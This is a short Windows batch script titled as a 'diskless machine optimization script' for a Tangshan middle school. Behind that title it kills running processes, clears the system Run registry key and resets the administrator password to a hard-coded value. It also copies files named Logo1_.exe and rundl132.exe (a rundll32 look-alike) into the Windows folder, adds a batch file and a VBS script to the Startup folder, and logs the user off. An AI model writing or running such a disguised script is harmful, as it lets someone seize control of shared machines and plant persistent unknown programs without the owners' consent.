@echo
color 0a
title 唐山八中无盘机优化脚本 V1.0
prompt  请稍候……$_
regedit /s files\pskill.reg
files\pskill -t Logo1_.exe
files\pskill -t rundl132.exe
files\pskill -t ITEpm.exe
files\pskill -t explorer.exe
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /f
regedit /s files\exp.reg
regedit /s files\first.reg
net user administrator cwfcwf19941007123456qwerty /y
md C:\cwf
copy files\winrar.exe C:\cwf
copy files\realplay.exe C:\cwf
cls
copy files\winword.exe C:\cwf
cls
copy files\img0.bmp C:\cwf /y
copy files\Logo1_.exe C:\winnt /y
copy files\rundl132.exe C:\winnt /y
copy files\pskill.exe C:\winnt
cls
color cf
cls
xcopy files\sgpy C:\progra~1\sgpy\ /e /a
color 0a
del C:\Docume~1\zq\桌面\BootXPv2.50.lnk
files\pskill -t Logo1_.exe
files\pskill -t rundl132.exe
copy files\firstrun.bat C:\winnt
copy files\firstrun.bat C:\docume~1\zq\「开始」菜单\程序\启动
copy files\hello.vbs C:\docume~1\zq\「开始」菜单\程序\启动
copy files\鱼缸XP.bat C:\Docume~1\zq\桌面
regedit /s files\wallpaper.reg
files\shutdown.exe /?
cls
files\shutdown.exe /l